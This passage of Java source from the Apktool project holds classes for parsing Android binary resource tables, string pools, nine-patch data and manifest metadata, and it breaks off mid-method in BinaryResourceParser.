                    if (refValue != null) {
                        sdkInfo.setMinSdkVersion(refValue);
                    }
                }
                String targetSdkVersion = sdkInfo.getTargetSdkVersion();
                if (targetSdkVersion != null) {
                    String refValue = ResXmlUtils.pullValueFromIntegers(apkDir, targetSdkVersion);
                    if (refValue != null) {
                        sdkInfo.setTargetSdkVersion(refValue);
                    }
                }
                String maxSdkVersion = sdkInfo.getMaxSdkVersion();
                if (maxSdkVersion != null) {
                    String refValue = ResXmlUtils.pullValueFromIntegers(apkDir, maxSdkVersion);
                    if (refValue != null) {
                        sdkInfo.setMaxSdkVersion(refValue);
                    }
                }
            }

            // Resolve versionInfo from resources.
            VersionInfo versionInfo = mApkInfo.getVersionInfo();
            if (!versionInfo.isEmpty()) {
                String versionName = versionInfo.getVersionName();
                if (versionName != null) {
                    String refValue = ResXmlUtils.pullValueFromStrings(apkDir, versionName);
                    if (refValue != null) {
                        versionInfo.setVersionName(refValue);
                    }
                }
            }

            // Record framework package IDs used by the resource table.
            List<Integer> framePackageIds = Lists.newArrayList(mTable.getFramePackageIds());
            if (!framePackageIds.isEmpty()) {
                UsesFramework usesFramework = mApkInfo.getUsesFramework();
                List<Integer> frameworkIds = usesFramework.getIds();
                framePackageIds.sort(null);
                for (int id : framePackageIds) {
                    frameworkIds.add(id);
                }
                usesFramework.setTag(mConfig.getFrameworkTag());
            }

            // Record library package names used by the resource table.
            List<Integer> libPackageIds = Lists.newArrayList(mTable.getLibPackageIds());
            if (!libPackageIds.isEmpty()) {
                List<String> usesLibrary = mApkInfo.getUsesLibrary();
                libPackageIds.sort(null);
                for (int id : libPackageIds) {
                    usesLibrary.add(mTable.getDynamicRefPackageName(id));
                }
            }
        } else {
            // Renaming not possible: manifest decoded without resources.
            resourcesInfo.setPackageName(null);
        }

        File manifest = new File(apkDir, "AndroidManifest.xml");

        if (!mConfig.isAnalysisMode()) {
            // Remove versionCode and versionName, it will be passed to aapt as a parameter via apktool.yml.
            ResXmlUtils.removeManifestVersions(manifest);
        }

        // Record feature flags.
        String[] flags = ResXmlUtils.pullManifestFeatureFlags(manifest);
        if (flags != null) {
            Map<String, Boolean> featureFlags = mApkInfo.getFeatureFlags();
            for (String flag : flags) {
                boolean value;
                if (flag.startsWith("!")) {
                    flag = flag.substring(1);
                    value = false;
                } else {
                    value = true;
                }
                featureFlags.put(flag, value);
            }
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/LayoutBounds.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.util.BinaryDataInputStream;

import java.io.IOException;

public final class LayoutBounds {
    public static final int MAGIC = 0x6E704C62; // npLb
    public static final int COLOR_TICK = 0xFFFF0000; // solid red

    public final int left, top, right, bottom;

    public LayoutBounds(int left, int top, int right, int bottom) {
        this.left = left;
        this.top = top;
        this.right = right;
        this.bottom = bottom;
    }

    public static LayoutBounds read(BinaryDataInputStream in) throws IOException {
        int left = Integer.reverseBytes(in.readInt());
        int top = Integer.reverseBytes(in.readInt());
        int right = Integer.reverseBytes(in.readInt());
        int bottom = Integer.reverseBytes(in.readInt());

        return new LayoutBounds(left, top, right, bottom);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/NinePatchData.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.util.BinaryDataInputStream;

import java.io.IOException;

public final class NinePatchData {
    public static final int MAGIC = 0x6E705463; // npTc
    public static final int COLOR_TICK = 0xFF000000; // solid black

    public final int[] xDivs, yDivs;
    public final int paddingLeft, paddingRight, paddingTop, paddingBottom;

    public NinePatchData(int[] xDivs, int[] yDivs, int paddingLeft, int paddingRight, int paddingTop,
                         int paddingBottom) {
        this.xDivs = xDivs;
        this.yDivs = yDivs;
        this.paddingLeft = paddingLeft;
        this.paddingRight = paddingRight;
        this.paddingTop = paddingTop;
        this.paddingBottom = paddingBottom;
    }

    public static NinePatchData read(BinaryDataInputStream in) throws IOException {
        in.skipByte(); // wasDeserialized
        int numXDivs = in.readUnsignedByte();
        int numYDivs = in.readUnsignedByte();
        in.skipByte(); // numColors
        in.skipInt(); // xDivsOffset
        in.skipInt(); // yDivsOffset
        int paddingLeft = in.readInt();
        int paddingRight = in.readInt();
        int paddingTop = in.readInt();
        int paddingBottom = in.readInt();
        in.skipInt(); // colorsOffset
        int[] xDivs = in.readIntArray(numXDivs);
        int[] yDivs = in.readIntArray(numYDivs);

        return new NinePatchData(xDivs, yDivs, paddingLeft, paddingRight, paddingTop, paddingBottom);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResChunkHeader.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.util.BinaryDataInputStream;

import java.io.IOException;

public final class ResChunkHeader {
    public static final int SIZE = 8;

    public static final int RES_NULL_TYPE = 0x0000;
    public static final int RES_STRING_POOL_TYPE = 0x0001;
    public static final int RES_TABLE_TYPE = 0x0002;
    public static final int RES_XML_TYPE = 0x0003;

    // Chunk types in RES_XML_TYPE
    public static final int RES_XML_FIRST_CHUNK_TYPE = 0x0100;
    public static final int RES_XML_START_NAMESPACE_TYPE = 0x0100;
    public static final int RES_XML_END_NAMESPACE_TYPE = 0x0101;
    public static final int RES_XML_START_ELEMENT_TYPE = 0x0102;
    public static final int RES_XML_END_ELEMENT_TYPE = 0x0103;
    public static final int RES_XML_CDATA_TYPE = 0x0104;
    public static final int RES_XML_LAST_CHUNK_TYPE = 0x017F;
    public static final int RES_XML_RESOURCE_MAP_TYPE = 0x0180;

    // Chunk types in RES_TABLE_TYPE
    public static final int RES_TABLE_PACKAGE_TYPE = 0x0200;
    public static final int RES_TABLE_TYPE_TYPE = 0x0201;
    public static final int RES_TABLE_TYPE_SPEC_TYPE = 0x0202;
    public static final int RES_TABLE_LIBRARY_TYPE = 0x0203;
    public static final int RES_TABLE_OVERLAYABLE_TYPE = 0x0204;
    public static final int RES_TABLE_OVERLAYABLE_POLICY_TYPE = 0x0205;
    public static final int RES_TABLE_STAGED_ALIAS_TYPE = 0x0206;

    public final int type;
    public final int headerSize;
    public final int size;

    public ResChunkHeader(int type, int headerSize, int size) {
        this.type = type;
        this.headerSize = headerSize;
        this.size = size;
    }

    public static ResChunkHeader read(BinaryDataInputStream in) throws IOException {
        // ResChunk_header
        int type = in.readUnsignedShort();
        int headerSize = in.readUnsignedShort();
        int size = in.readInt();

        return new ResChunkHeader(type, headerSize, size);
    }

    public static String nameOf(int type) {
        switch (type) {
            case RES_NULL_TYPE:
                return "RES_NULL_TYPE";
            case RES_STRING_POOL_TYPE:
                return "RES_STRING_POOL_TYPE";
            case RES_TABLE_TYPE:
                return "RES_TABLE_TYPE";
            case RES_XML_TYPE:
                return "RES_XML_TYPE";
            case RES_XML_START_NAMESPACE_TYPE:
                return "RES_XML_START_NAMESPACE_TYPE";
            case RES_XML_END_NAMESPACE_TYPE:
                return "RES_XML_END_NAMESPACE_TYPE";
            case RES_XML_START_ELEMENT_TYPE:
                return "RES_XML_START_ELEMENT_TYPE";
            case RES_XML_END_ELEMENT_TYPE:
                return "RES_XML_END_ELEMENT_TYPE";
            case RES_XML_CDATA_TYPE:
                return "RES_XML_CDATA_TYPE";
            case RES_XML_RESOURCE_MAP_TYPE:
                return "RES_XML_RESOURCE_MAP_TYPE";
            case RES_TABLE_PACKAGE_TYPE:
                return "RES_TABLE_PACKAGE_TYPE";
            case RES_TABLE_TYPE_TYPE:
                return "RES_TABLE_TYPE_TYPE";
            case RES_TABLE_TYPE_SPEC_TYPE:
                return "RES_TABLE_TYPE_SPEC_TYPE";
            case RES_TABLE_LIBRARY_TYPE:
                return "RES_TABLE_LIBRARY_TYPE";
            case RES_TABLE_OVERLAYABLE_TYPE:
                return "RES_TABLE_OVERLAYABLE_TYPE";
            case RES_TABLE_OVERLAYABLE_POLICY_TYPE:
                return "RES_TABLE_OVERLAYABLE_POLICY_TYPE";
            case RES_TABLE_STAGED_ALIAS_TYPE:
                return "RES_TABLE_STAGED_ALIAS_TYPE";
            default:
                return String.format("0x%04x", type);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResStringPool.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import brut.androlib.res.decoder.ResChunkPullParser;
import brut.common.Log;
import brut.util.BinaryDataInputStream;
import com.google.common.annotations.VisibleForTesting;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.CharacterCodingException;
import java.nio.charset.Charset;
import java.nio.charset.CharsetDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

public class ResStringPool {
    private static final String TAG = ResStringPool.class.getName();

    private static final CharsetDecoder UTF16LE_DECODER = StandardCharsets.UTF_16LE.newDecoder();
    private static final CharsetDecoder UTF8_DECODER = StandardCharsets.UTF_8.newDecoder();
    private static final CharsetDecoder CESU8_DECODER = Charset.forName("CESU8").newDecoder();

    private static final int UTF8_FLAG = 0x00000100;
    private static final int HEADER_SIZE = 28;

    private final int[] mStringOffsets;
    private final byte[] mStrings;
    private final int[] mStyleOffsets;
    private final int[] mStyles;
    private final boolean mIsUtf8;

    private ResStringPool(int[] stringOffsets, byte[] strings, int[] styleOffsets, int[] styles, boolean isUtf8) {
        mStringOffsets = stringOffsets;
        mStrings = strings;
        mStyleOffsets = styleOffsets;
        mStyles = styles;
        mIsUtf8 = isUtf8;
    }

    @VisibleForTesting
    ResStringPool(byte[] strings, boolean isUtf8) {
        this(new int[0], strings, new int[0], new int[0], isUtf8);
    }

    public static ResStringPool parse(ResChunkPullParser parser) throws IOException {
        BinaryDataInputStream in = parser.stream();
        // ResStringPool_header
        int stringCount = in.readInt();
        int styleCount = in.readInt();
        int flags = in.readInt();
        int stringsOffset = in.readInt();
        int stylesOffset = in.readInt();

        // For some apps they pack the chunk header with more unused data at end.
        int skipped = parser.skipHeader();
        if (skipped > 0) {
            Log.d(TAG, "Skipped unknown %s bytes at end of %s chunk header.", skipped, parser.chunkName());
        }

        int[] stringOffsets = readIntArraySafe(in, stringCount, parser.chunkStart() + stringsOffset);
        int[] styleOffsets = readIntArraySafe(in, styleCount, parser.chunkStart() + stylesOffset);

        // If we have both strings and even just a lying style offset - let's calculate the size of the strings without
        // accidentally parsing all the styles.
        int size = parser.chunkSize() - stringsOffset;
        if (styleCount > 0) {
            size = stylesOffset - stringsOffset;
        }

        byte[] strings = in.readBytes(size);

        // #3236 - Some apps give a styles offset, but have 0 styles. Make this check more robust.
        int[] styles;
        if (stylesOffset > 0 && styleCount > 0) {
            size = parser.chunkSize() - stylesOffset;
            styles = in.readIntArray(size / 4);
        } else {
            styles = new int[0];
        }

        // In case we aren't 4 byte aligned we need to skip the padding bytes.
        in.skipBytes(size % 4);

        boolean isUtf8 = (flags & UTF8_FLAG) != 0;

        return new ResStringPool(stringOffsets, strings, styleOffsets, styles, isUtf8);
    }

    private static int[] readIntArraySafe(BinaryDataInputStream in, int len, long maxPosition) throws IOException {
        int[] arr = new int[len];
        for (int i = 0; i < len; i++) {
            // #3236 - Some apps have more strings than can fit into the block. This function takes an expected max
            // position and if we are past it, we return early during processing.
            if (in.position() >= maxPosition) {
                Log.d(TAG, "Bad string block: string entry is at %s, past end at %s", in.position(), maxPosition);
                return arr;
            }

            arr[i] = in.readInt();
        }
        return arr;
    }

    public CharSequence getText(int index) {
        String string = getString(index);
        if (string == null) {
            return null;
        }

        // Return the raw string if it has no styles.
        int[] style = getStyle(index);
        if (style == null) {
            return string;
        }

        // Convert the styles to spans.
        int len = string.length();
        StyledString.Span[] spans = new StyledString.Span[style.length / 3];
        int spansCount = 0;

        for (int i = 0; i < style.length; i += 3) {
            String tag = getString(style[i]);
            int firstChar = style[i + 1];
            int lastChar = style[i + 2];

            // Ignore the style if it's not in range.
            if (firstChar < 0 || firstChar > len || lastChar > len) {
                continue;
            }

            spans[spansCount++] = new StyledString.Span(tag, firstChar, lastChar);
        }

        if (spansCount < spans.length) {
            spans = Arrays.copyOf(spans, spansCount);
        }

        return new StyledString(string, spans);
    }

    public String getString(int index) {
        if (index < 0 || index >= mStringOffsets.length || mStrings.length == 0) {
            return null;
        }

        int offset = mStringOffsets[index];
        int[] val;
        if (mIsUtf8) {
            val = getUtf8(mStrings, offset);
            offset = val[0];
        } else {
            val = getUtf16(mStrings, offset);
            offset += val[0];
        }

        int length = val[1];
        return decodeString(offset, length);
    }

    @VisibleForTesting
    String decodeString(int offset, int length) {
        try {
            ByteBuffer buffer = ByteBuffer.wrap(mStrings, offset, length);
            return (mIsUtf8 ? UTF8_DECODER : UTF16LE_DECODER).decode(buffer).toString();
        } catch (CharacterCodingException ignored) {
            if (!mIsUtf8) {
                Log.w(TAG, "Failed to decode a string at offset %s of length %s", offset, length);
                return null;
            }
        } catch (IndexOutOfBoundsException ignored) {
            if (!mIsUtf8) {
                Log.w(TAG, "String extends outside of pool at %s of length %s", offset, length);
                return null;
            }
        }

        // In some cases, Android uses 3-byte UTF-8 sequences instead of 4-bytes.
        // If decoding failed, we try to use CESU-8 decoder, which is closer to what Android actually uses.
        try {
            ByteBuffer buffer = ByteBuffer.wrap(mStrings, offset, length);
            return CESU8_DECODER.decode(buffer).toString();
        } catch (CharacterCodingException ignored) {
            Log.w(TAG, "Failed to decode a string with CESU-8 decoder.");
            return null;
        }
    }

    public int findString(String string) {
        if (string == null || mStringOffsets.length == 0 || mStrings.length == 0) {
            return -1;
        }

        int len = string.length();
        for (int i = 0; i < mStringOffsets.length; i++) {
            int offset = mStringOffsets[i];
            int length = getShort(mStrings, offset);
            if (length != len) {
                continue;
            }

            int j = 0;
            for (; j < length; j++) {
                offset += 2;
                if (string.charAt(j) != getShort(mStrings, offset)) {
                    break;
                }
            }
            if (j == length) {
                return i;
            }
        }

        return -1;
    }

    /**
     * Returns style information as an array of int triplets:
     * 1. Index of tag name ('b','i', etc.).
     * 2. Index of tag start in the string.
     * 3. Index of tag end in the string.
     */
    private int[] getStyle(int index) {
        if (index < 0 || index >= mStyleOffsets.length || mStyles.length == 0) {
            return null;
        }

        // Make sure not to count a partial triplet.
        int offset = mStyleOffsets[index] / 4;
        int count = 0;
        for (int i = offset; i + 2 < mStyles.length; i += 3) {
            if (mStyles[i] < 0) {
                break;
            }
            count++;
        }
        if (count == 0) {
            return null;
        }

        int[] style = new int[count * 3];
        System.arraycopy(mStyles, offset, style, 0, style.length);
        return style;
    }

    private static int getShort(byte[] array, int offset) {
        return ((array[offset + 1] & 0xFF) << 8) | (array[offset] & 0xFF);
    }

    private static int[] getUtf8(byte[] array, int offset) {
        int val = array[offset];

        // Skip the UTF-16 length of the string.
        if ((val & 0x80) != 0) {
            offset += 2;
        } else {
            offset++;
        }

        // Read the UTF-8 length of the string.
        val = array[offset];
        offset++;
        int length;
        if ((val & 0x80) != 0) {
            int low = array[offset] & 0xFF;
            length = ((val & 0x7F) << 8) + low;
            offset++;
        } else {
            length = val;
        }

        return new int[] { offset, length };
    }

    private static int[] getUtf16(byte[] array, int offset) {
        int val = ((array[offset + 1] & 0xFF) << 8) | (array[offset] & 0xFF);

        if ((val & 0x8000) != 0) {
            int high = (array[offset + 3] & 0xFF) << 8;
            int low = array[offset + 2] & 0xFF;
            int len_value = ((val & 0x7FFF) << 16) + high + low;
            return new int[] { 4, len_value * 2 };
        }

        return new int[] { 2, val * 2 };
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/StyledString.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import java.util.Arrays;
import java.util.Objects;

public class StyledString implements CharSequence {
    private final String mValue;
    private final Span[] mSpans;

    public StyledString(String value, Span[] spans) {
        assert value != null && spans != null;
        mValue = value;
        mSpans = spans;
    }

    public String getValue() {
        return mValue;
    }

    public Span[] getSpans() {
        return mSpans;
    }

    @Override
    public int length() {
        return mValue.length();
    }

    @Override
    public char charAt(int index) {
        return mValue.charAt(index);
    }

    @Override
    public CharSequence subSequence(int start, int end) {
        return mValue.subSequence(start, end);
    }

    @Override
    public String toString() {
        return mValue;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof StyledString) {
            StyledString other = (StyledString) obj;
            return mValue.equals(other.mValue)
                && Arrays.equals(mSpans, other.mSpans);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mValue, Arrays.hashCode(mSpans));
    }

    public static class Span {
        private final String mTag;
        private final int mFirstChar;
        private final int mLastChar;

        public Span(String tag, int firstChar, int lastChar) {
            assert tag != null;
            mTag = tag;
            mFirstChar = firstChar;
            mLastChar = lastChar;
        }

        public String getTag() {
            return mTag;
        }

        public int getFirstChar() {
            return mFirstChar;
        }

        public int getLastChar() {
            return mLastChar;
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/BinaryResourceParser.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.UndefinedResObjectException;
import brut.androlib.res.data.ResChunkHeader;
import brut.androlib.res.data.ResStringPool;
import brut.androlib.res.table.*;
import brut.androlib.res.table.value.*;
import brut.common.Log;
import brut.util.BinaryDataInputStream;
import com.google.common.io.BaseEncoding;
import org.apache.commons.lang3.tuple.Pair;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class BinaryResourceParser {
    private static final String TAG = BinaryResourceParser.class.getName();

    private static final int NO_ENTRY = 0xFFFFFFFF;
    private static final int NO_ENTRY_OFFSET16 = 0xFFFF;

    // ResTable_typeSpec flags:
    // Additional flag indicating an entry is public.
    private static final int SPEC_FLAG_PUBLIC = 0x40000000;
    // Additional flag indicating the resource id for this resource may change in a future
    // build. If this flag is set, the SPEC_PUBLIC flag is also set since the resource must be
    // public to be exposed as an API to other applications.
    private static final int SPEC_FLAG_STAGED_API = 0x20000000;

    // ResTable_type flags:
    // If set, the entry is sparse, and encodes both the entry ID and offset into each entry,
    // and a binary search is used to find the key. Only available on platforms >= O.
    // Mark any types that use this with a v26 qualifier to prevent runtime issues on older platforms.
    private static final int TYPE_FLAG_SPARSE = 0x01;
    // If set, the offsets to the entries are encoded in 16-bit, real_offset = offset * 4u
    // An 16-bit offset of 0xffffu means a NO_ENTRY.
    private static final int TYPE_FLAG_OFFSET16 = 0x02;

    // ResTable_entry flags:
    // If set, this is a complex entry, holding a set of name/value mappings.
    // It is followed by an array of ResTable_map structures.
    private static final int ENTRY_FLAG_COMPLEX = 0x0001;
    // If set, this resource has been declared public, so libraries are allowed to reference it.
    private static final int ENTRY_FLAG_PUBLIC = 0x0002;
    // If set, this is a weak resource and may be overridden by strong resources of the same name/type.
    // This is only useful during linking with other resource tables.
    private static final int ENTRY_FLAG_WEAK = 0x0004;
    // If set, this is a compact entry with data type and value directly encoded in the entry.
    private static final int ENTRY_FLAG_COMPACT = 0x0008;
    // If set, this resource relies on an android feature flag.
    // This should not be encountered in most cases (#3993)
    private static final int ENTRY_FLAG_FEATUREFLAG = 0x0010;

    private final ResTable mTable;
    private final boolean mKeepBrokenResources;
    private final boolean mAllowDummyEntrySpecs;
    private final Set<ResId> mMissingEntrySpecs;
    private final Set<ResConfig> mInvalidConfigs;

    private BinaryDataInputStream mIn;
    private ResStringPool mValueStringPool;
    private int mPackageCount;
    private ResPackage mPackage;
    private int mTypeIdOffset;
    private ResStringPool mTypeStringPool;
    private ResStringPool mKeyStringPool;
    private boolean mSparseEntries;
    private boolean mCompactEntries;
    private List<Pair<Long, Integer>> mEntrySpecFlagsOffsets;

    public BinaryResourceParser(ResTable table, boolean keepBrokenResources, boolean allowDummyEntrySpecs) {
        mTable = table;
        mKeepBrokenResources = keepBrokenResources;
        mAllowDummyEntrySpecs = allowDummyEntrySpecs;
        mMissingEntrySpecs = new HashSet<>();
        mInvalidConfigs = new HashSet<>();
    }

    public boolean isSparseEntries() {
        return mSparseEntries;
    }

    public boolean isCompactEntries() {
        return mCompactEntries;
    }

    public void enableCollectFlagsOffsets() {
        mEntrySpecFlagsOffsets = new ArrayList<>();
    }

    public Collection<Pair<Long, Integer>> getEntrySpecFlagsOffsets() {
        return mEntrySpecFlagsOffsets;
    }

    public void parse(InputStream in) throws AndrolibException {
        reset();
        mIn = new BinaryDataInputStream(in);

        ResChunkPullParser parser = new ResChunkPullParser(mIn);
        try {
            if (!nextChunk(parser)) {
                throw new AndrolibException("Input file is empty.");
            }
            if (parser.chunkType() != ResChunkHeader.RES_TABLE_TYPE) {
                throw new AndrolibException("Unexpected chunk: " + parser.chunkName() + " (expected: RES_TABLE_TYPE)");
            }

            parseTable(parser);

            Log.d(TAG, "End of chunks at 0x%08x", mIn.position());

            // We can't use remaining() here, the length of the main stream is unknown.
            if (mIn.available() > 0) {
                Log.d(TAG, "Ignoring trailing data at 0x%08x.", mIn.position());
            }
        } catch (IOException ex) {
            throw new AndrolibException("Could not decode arsc file.", ex);
        }
    }

    public void reset() {
        mIn = null;
        mMissingEntrySpecs.clear();
        mInvalidConfigs.clear();
        mValueStringPool = null;
        mPackageCount = 0;
        mPackage = null;
        mTypeIdOffset = 0;
        mTypeStringPool = null;
        mKeyStringPool = null;
        mSparseEntries = false;
        mCompactEntries = false;
        if (mEntrySpecFlagsOffsets != null) {
            mEntrySpecFlagsOffsets.clear();
        }
    }

    private boolean nextChunk(ResChunkPullParser parser) throws IOException {
        // Skip padding or unknown data at the end of current chunk.
        if (parser.isChunk()) {
            int skipped = parser.skipChunk();
            if (skipped > 0) {
                Log.d(TAG, "Skipped unknown %s bytes at end of %s chunk.", skipped, parser.chunkName());
            }
        }

        // Parse next chunk.
        while (parser.next()) {
            // Skip unknown or unsupported chunks.
            if (parser.chunkType() == ResChunkHeader.RES_NULL_TYPE) {
                Log.d(TAG, "Skipping unknown chunk (%s) of %s bytes at 0x%08x.",
                    parser.chunkName(), parser.chunkSize(), parser.chunkStart());
                parser.skipChunk();
                continue;
            }

            // Return this chunk.
            Log.d(TAG, "Chunk at 0x%08x: %s (%s bytes)", parser.chunkStart(), parser.chunkName(), parser.chunkSize());
            return true;
        }

        // End of chunks.
        return false;
    }

    private void parseTable(ResChunkPullParser parser) throws AndrolibException, IOException {
        // ResTable_header
        int packageCount = mIn.readInt();

        skipUnreadHeader(parser);

        parser = new ResChunkPullParser(mIn, parser.dataSize());
        while (nextChunk(parser)) {
            switch (parser.chunkType()) {
                case ResChunkHeader.RES_STRING_POOL_TYPE:
                    parseStringPool(parser);
                    break;
                case ResChunkHeader.RES_TABLE_PACKAGE_TYPE:
                    parsePackage(parser);
                    break;
                default:
                    skipUnexpectedChunk(parser);
                    break;
            }
        }

        if (mPackageCount != packageCount) {
            Log.w(TAG, "Unexpected package count: %s (expected: %s)", mPackageCount, packageCount);
        }
    }

    private void parseStringPool(ResChunkPullParser parser) throws AndrolibException, IOException {
        ResStringPool stringPool = ResStringPool.parse(parser);

        if (mValueStringPool == null) {
            mValueStringPool = stringPool;
        } else if (mTypeStringPool == null) {
            mTypeStringPool = stringPool;
        } else if (mKeyStringPool == null) {
            mKeyStringPool = stringPool;
        } else {
            skipUnexpectedChunk(parser);
        }
    }

    private void parsePackage(ResChunkPullParser parser) throws AndrolibException, IOException {
        // ResTable_package
        int id = mIn.readInt();
        String name = mIn.readUtf16(128);
        mIn.skipInt(); // typeStrings
        mIn.skipInt(); // lastPublicType
        mIn.skipInt(); // keyStrings
        mIn.skipInt(); // lastPublicKey

        // TypeIdOffset was added platform_frameworks_base/@f90f2f8dc36e7243b85e0b6a7fd5a590893c827e
        // which is only in split/new apps.
        // sizeof(ResTable_package) = short + short + int + int + char[128] + int * 5 = 288
        if (parser.headerSize() >= 288) {
            mTypeIdOffset = mIn.readInt();

            if (mTypeIdOffset > 0) {
                Log.w(TAG, "Please report this app here: https://github.com/iBotPeaches/Apktool/issues/1728");
            }
        } else {
            mTypeIdOffset = 0;
        }

        skipUnreadHeader(parser);

        try {
            mPackage = mTable.getPackageGroup(id).addSubPackage();
        } catch (UndefinedResObjectException ignored) {
            mPackage = mTable.addPackageGroup(id, name).getBasePackage();
        } finally {
            mPackageCount++;
        }

        parser = new ResChunkPullParser(mIn, parser.dataSize());
        while (nextChunk(parser)) {
            switch (parser.chunkType()) {
                case ResChunkHeader.RES_STRING_POOL_TYPE:
                    parseStringPool(parser);
                    break;
                case ResChunkHeader.RES_TABLE_TYPE_SPEC_TYPE:
                    parseTypeSpec(parser);
                    break;
                case ResChunkHeader.RES_TABLE_TYPE_TYPE:
                    parseType(parser);
                    break;
                case ResChunkHeader.RES_TABLE_LIBRARY_TYPE:
                    parseLibrary(parser);
                    break;
                case ResChunkHeader.RES_TABLE_OVERLAYABLE_TYPE:
                    parseOverlayable(parser);
                    break;
                case ResChunkHeader.RES_TABLE_STAGED_ALIAS_TYPE:
                    parseStagedAliases(parser);
                    break;
                default:
                    skipUnexpectedChunk(parser);
                    break;
            }
        }

        // Clean up.
        injectDummyEntrySpecs();
        mInvalidConfigs.clear();
        mPackage = null;
        mTypeIdOffset = 0;
        mTypeStringPool = null;
        mKeyStringPool = null;
    }

    private void parseTypeSpec(ResChunkPullParser parser) throws AndrolibException, IOException {
        if (mTypeStringPool == null) {
            throw new AndrolibException("Missing type string pool.");
        }

        // ResTable_typeSpec
        int id = mIn.readUnsignedByte();
        mIn.skipByte(); // res0
        mIn.skipShort(); // typesCount
        int entryCount = mIn.readInt();

        skipUnreadHeader(parser);

        if (mEntrySpecFlagsOffsets != null) {
            mEntrySpecFlagsOffsets.add(Pair.of(mIn.position(), entryCount));
        }
        mIn.skipBytes(entryCount * 4); // flags

        mPackage.addTypeSpec(id, mTypeStringPool.getString(id - 1));
    }

    private void parseType(ResChunkPullParser parser) throws AndrolibException, IOException {
        if (mTypeStringPool == null) {
            throw new AndrolibException("Missing type string pool.");
        }
        if (mKeyStringPool == null) {
            throw new AndrolibException("Missing key string pool");
        }

        // ResTable_type
        int id = mIn.readUnsignedByte() - mTypeIdOffset;
        int flags = mIn.readUnsignedByte();
        mIn.skipShort(); // reserved
        int entryCount = mIn.readInt();
        int entriesStart = mIn.readInt();
        ResConfig config = parseConfig();

        skipUnreadHeader(parser);

        // #3311 - Some older apps have no TYPE_SPEC chunks, but still define TYPE chunks.
        ResTypeSpec typeSpec;
        try {
